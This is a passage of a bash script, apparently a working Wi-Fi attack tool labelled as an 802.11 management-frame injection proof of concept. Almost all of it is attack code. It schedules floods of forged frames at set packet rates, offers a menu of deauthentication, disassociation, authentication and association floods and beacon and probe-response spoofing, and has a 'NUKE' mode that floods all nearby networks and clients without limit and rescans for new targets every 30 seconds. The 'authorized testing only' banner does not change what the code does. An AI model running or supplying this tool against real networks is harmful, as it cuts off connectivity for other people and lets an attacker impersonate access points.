        if [ "$t" = ap ]; then frv 0000 "$m" $FAKE "$m" "04010a00$(ssid_ies "$s")"; else frv 0000 "${AP_CTX:-$BC}" "$m" "${AP_CTX:-$BC}" "04010a00$(ssid_ies "$s")"; fi;;
    8)  frv d000 "$m" "$m" "$m" 0409deadbeef4f503132504f43;;
    9)  frv d000 "$m" "$m" "$m" 7fdeadbeef4f503132504f43;;
    10) frv d000 "$m" "$m" "$m" 0000000000;;
    11) s=$ssid; [ -z "$s" ] && s=$SSID
        if [ "$t" = ap ]; then frv 8000 $BC "$m" "$m" "000000000000000064000401$(ssid_ies "$s")"; else frv 5000 $BC "$m" "${AP_CTX:-$BC}" "000000000000000064000401$(ssid_ies "$s")"; fi;;
    12) FRV=$SCHED_HEX;;
    *)  bld_nuke "$@";;
  esac
}

sched_run() {
  local budget=${1:-0} PPS=${2:-$NUKE_PPS} title="${3:-scheduled flood}"
  local STEP=$(( 1000000 / PPS )); [ "$STEP" -lt 1 ] && STEP=1
  local idx=0 tog=0 sent=0 ok=0 key="" out="" secs=0 dt=0 actual=0
  local now_t next total_t0 win_t win_sent=0 hint="+=up -=dn q=quit"
  [ "$budget" -eq 0 ] && hint="+=up -=dn s=rescan q=quit"
  now_t=${EPOCHREALTIME/./}; next=$now_t; total_t0=$now_t; win_t=$now_t
  [ "${NUKE_DEBUG:-}" = 1 ] && { PS4='+[+${EPOCHREALTIME/./}µs] '; set -x; }
  echo "  [sched] $title -- ${#NUKE_MAC[@]} target(s), budget=${budget:-inf}, target ${PPS} pps"
  trap 'echo; echo "  [sched] SIGINT -- $sent frames"; exit 130' INT
  while [ "$budget" -eq 0 ] || [ "$sent" -lt "$budget" ]; do
    idx=$(( idx % ${#NUKE_MAC[@]} ))   # clamp: refresh may have shrunk the set
    local mac=${NUKE_MAC[$idx]} freq=${NUKE_FREQ[$idx]}
    tog=$((1 - tog))
    $SCHED_BUILDER "$idx" "$mac" "$freq" "$tog"
    if [ "${SCHED_DRY:-}" = 1 ]; then
      out="RESULT: accepted for TX, cookie reply (DRY RUN)"
    else
      out=$("$TOOL" --fast "$IFACE" "$freq" "$FRV" 2>&1) || true
    fi
    if [[ "$out" == *"accepted for TX"* || "$out" == *"ACK (accepted)"* ]]; then ok=$((ok+1)); fi
    sent=$((sent+1))
    next=$(( next + STEP )); now_t=${EPOCHREALTIME/./}
    if [ "$next" -gt "$now_t" ]; then
      local wait_us=$(( next - now_t )) wait_s=""
      printf -v wait_s '%d.%06d' $(( wait_us/1000000 )) $(( wait_us%1000000 ))
      key=""; read -r -t "$wait_s" -n 1 key || true
      case "$key" in
        +|=) PPS=$((PPS+10));  [ "$PPS" -gt 1000 ] && PPS=1000; STEP=$((1000000/PPS)); echo "  [sched] target -> $PPS pps";;
        -|_) PPS=$((PPS-10));  [ "$PPS" -lt 10 ] && PPS=10; STEP=$((1000000/PPS)); echo "  [sched] target -> $PPS pps";;
        s|S) if [ "$budget" -eq 0 ] && [ "$SCHED_SCOPE" = nuke ] && nuke_refresh; then
               echo "  [sched] rescan -> ${#NUKE_MAC[@]} target(s), $NUKE_STN station(s)"; idx=0
             else echo "  [sched] rescan N/A in this burst (finite target set)"; fi;;
        q|Q) break;;
      esac
    else
      next=$now_t   # overrun: resync so a slow frame cannot spiral
    fi
    now_t=${EPOCHREALTIME/./}; dt=$(( now_t - win_t ))
    if [ "$dt" -ge 1000000 ]; then
      if [ $((sent-win_sent)) -gt 0 ]; then actual=$(( (sent - win_sent) * 1000000 / dt )); else actual=0; fi
      local stxt=""; [ "$SCHED_SCOPE" = nuke ] && stxt=" . stations $NUKE_STN"
      echo "  [sched] ${#NUKE_MAC[@]} target(s)$stxt . target ${PPS} pps actual ${actual} pps . sent $sent (ok $ok) . $hint"
      win_t=$now_t; win_sent=$sent
      secs=$((secs+1))
      if [ "$budget" -eq 0 ] && [ "$SCHED_SCOPE" = nuke ] && [ "$secs" -ge 30 ]; then
        if nuke_refresh; then echo "  [sched] 30s refresh -> ${#NUKE_MAC[@]} target(s), $NUKE_STN station(s)"; idx=0; fi
        secs=0
      fi
    fi
  done
  trap - INT
  now_t=${EPOCHREALTIME/./}; dt=$(( now_t - total_t0 ))
  if [ "$dt" -gt 0 ]; then avg=$(( sent * 1000000 / dt )); else avg=0; fi
  echo "  [sched] done -- $sent frames (${ok} accepted) over $((dt/1000000))s, avg $avg pps, ${#NUKE_MAC[@]} target(s)"
}

sched_menu_burst() { # attack# [frames [pps]] — drive menu attack k through the scheduler
  local atk=${1:-1} frames=${2:-} pps=${3:-}
  [ "$atk" -ge 1 ] && [ "$atk" -le 12 ] || { echo "  ? attack# must be 1..12"; return; }
  [ "${#NUKE_MAC[@]}" -gt 0 ] || { echo "  ? no multi-target set loaded"; return; }
  [ -n "$frames" ] || { printf '  frames to send: '; read -r frames; }
  case "$frames" in ''|0|*[!0-9]*) echo "  ? frames must be a positive number"; return;; esac
  [ -n "$pps" ] || { printf '  target pps [%s]: ' "$NUKE_PPS"; read -r pps; pps=${pps:-$NUKE_PPS}; }
  case "$pps" in ''|0|*[!0-9]*) echo "  ? pps must be a positive number"; return;; esac
  SCHED_MODE=$atk
  if [ "$atk" = 2 ] || [ "$atk" = 4 ]; then
    local anyap=0 i
    for i in "${NUKE_TYPE[@]:-}"; do [ "$i" = ap ] && { anyap=1; break; }; done
    if [ "$anyap" -eq 1 ]; then
      printf '  directed client MAC [%s]: ' "$FAKE"; read -r SCHED_CLI
      SCHED_CLI=${SCHED_CLI:-$FAKE}; SCHED_CLI=$(echo "$SCHED_CLI" | tr -d ':' | tr 'A-F' 'a-f')
    fi
  fi
  if [ "$atk" = 12 ]; then printf '  hex frame: '; read -r SCHED_HEX; fi
  SCHED_SCOPE=menu; SCHED_BUILDER=bld_sched
  sched_run "$frames" "$pps" "targeted attack #$atk scheduled burst"
}

# ---- menus ----------------------------------------------------------------------
echo "=================================================================="
echo " OP12 cfg80211 mgmt-injection PoC (station mode, end-to-end)"
echo "=================================================================="
echo " AUTHORIZED TESTING ONLY — networks/devices you own."
echo " Type NUKE [N] instead of YES for the destructive deauth demo (N = bounded frame count;"
echo " omitted = persistent until killed). NOT safe. Scheduled bursts of any menu attack: option 13."
printf ' Type YES to arm: '; read -r arm
case "$arm" in
  YES) ;;
  *)
    if [[ "$arm" =~ ^[Nn][Uu][Kk][Ee] ]]; then
      nf=0
      [[ "$arm" =~ [0-9]+ ]] && nf=${BASH_REMATCH[0]}
      nuke_mode "$nf"
      exit 0
    fi
    echo "not armed."; exit 0;;
esac

own_state
echo " own: $IFACE mac=$OWN state=$([ $ASSOC -eq 1 ] && echo "assoc bssid=$AP_BSSID freq=$FREQ ssid=\"$SSID\"" || echo 'unassociated (station mode)')"
echo " tool: $TOOL  fake-client=$FAKE"

while true; do            # target lock loop
  read_lock
  while true; do          # attack loop — target stays LOCKED
    cat << MENU

  --- LOCKED: $LOCK_MAC [$LOCK_TYPE] freq=$LOCK_FREQ ($LOCK_LBL) ---
  1 * deauth  (ap: BCAST from AP | sta: AP->target)
  2 * deauth directed (ap: AP->client prompt | sta: target->AP)
  3 * disassoc (ap: BCAST from AP | sta: AP->target)
  4 * disassoc directed
  5 # probe-req flood (target SSID)
  6 * auth flood (join attempt)
  7 * assoc-req flood (join attempt)
  8   public    action cat=04 -> target
  9   vendor    action cat=7f (OP12POC tag) -> target
  10  non-public action cat=00 -> target
  11  beacon spoof (ap) / probe-resp spoof (station)
  12  custom hex frame
  13 * scheduled burst via scheduler: '13 <attack#> <frames> [pps]'  (shorthand '<a#>s <frames> [pps]')
   ---
   A   safe demo set (5,8,9,10 — one shot each)
   V   verify end-to-end state
   I   capability info
   R   re-lock target (rescan)
   Q   quit
MENU
    printf ' choice: '; read -r c || exit 0
    tok=(); read -ra tok <<<"$c"
    if [ "${tok[0]:-}" = "13" ]; then sched_menu_burst "${tok[1]:-1}" "${tok[2]:-}" "${tok[3]:-}"; continue; fi
    if [[ "${tok[0]:-}" =~ ^[0-9]+[sS]$ ]]; then sched_menu_burst "${tok[0]%[sS]}" "${tok[1]:-}" "${tok[2]:-}"; continue; fi
    case "$c" in
      1) atk_deauth1;;    2) atk_deauth2;;    3) atk_disassoc1;;  4) atk_disassoc2;;
      5) atk_probe;;      6) atk_auth;;       7) atk_assoc;;
      8) atk_pub;;        9) atk_vendor;;    10) atk_nonpub;;
      11) atk_beacon;;   12) atk_custom;;
      A|a) echo "  --- safe demo set ---"; _o=$REPEAT; REPEAT=1; atk_probe; atk_pub; atk_vendor; atk_nonpub; REPEAT=$_o;;
      V|v) atk_verify;;
      I|i) atk_info;;
      R|r) break;;
      Q|q) echo "bye."; exit 0;;
      *) echo "  ?";;
    esac
  done
done
